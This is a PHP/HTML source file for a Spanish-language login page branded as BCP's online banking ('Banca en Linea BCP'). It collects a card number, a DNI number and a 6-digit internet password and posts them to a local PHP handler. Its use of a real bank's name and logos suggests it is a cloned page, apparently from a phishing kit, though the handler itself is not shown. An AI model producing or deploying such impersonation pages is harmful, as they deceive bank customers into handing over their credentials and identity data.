<?php
$error = null;
if (isset($_GET["error"])) {
    $error = "Credenciales incorrectas";
}
?>
<!DOCTYPE html>
<html lang="es">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login | Banca en Linea BCP</title>
    <link href="css/style_login.css" rel="stylesheet">
    <link rel="shortcut icon" href="img/bcp_logo.png" type="image/x-icon">
    <link rel="stylesheet" href="keyboard/keyborad.css">
    <link href="https://fonts.googleapis.com/icon?family=Material+Icons" rel="stylesheet">
</head>

<body>
    <main>
        <!-- <?php include 'modals/alerta_dispositivo.php' ?> -->
        <div class="logo"><img src="img/loguito.png" alt="logo_bcp.jpg"></div>
        <div class="flex">
            <!--Cambiar image-->
            <div class="img_trabajador"><img src="img/bcp_bycer.jpg" alt="imagen_login.jpg"></img></div>
            <div class="iniciar_sesion">
                <h1>Ingresa a tu banca en linea</h1>
                <form action="php/user_login.php" method="POST" autocomplete="off">
                    <div>
                        <input type="text" placeholder="Numero de tarjeta de debido o credito" name="tarjeta"
                            autocomplete="off">
                    </div>
                    <div class="group">
                        <input class="only_text" disabled value="DNI" />
                        <input type="text" placeholder="Nº de Documento" name="dni" autocomplete="off">
                    </div>
                    <div>
                        <input type="password" class="use-keyboard-input"  placeholder="Clave de internet de 6 dígitos" name="clave_internet"
                            autocomplete="off" maxlength="6" id="digitos" required>
                    </div>
                    <?php if ($error != null): ?>
                        <p class="error"><?= $error ?></p>
                    <?php endif; ?>
                    <button type="submit">Ingresar</button>
                </form>
            </div>
        </div>
    </main>
    <script src="js/"></script>
    <script src="keyboard/keyboard.js"></script>
    <script src="js/limite_clave_internet.js"></script>
</body>

</html>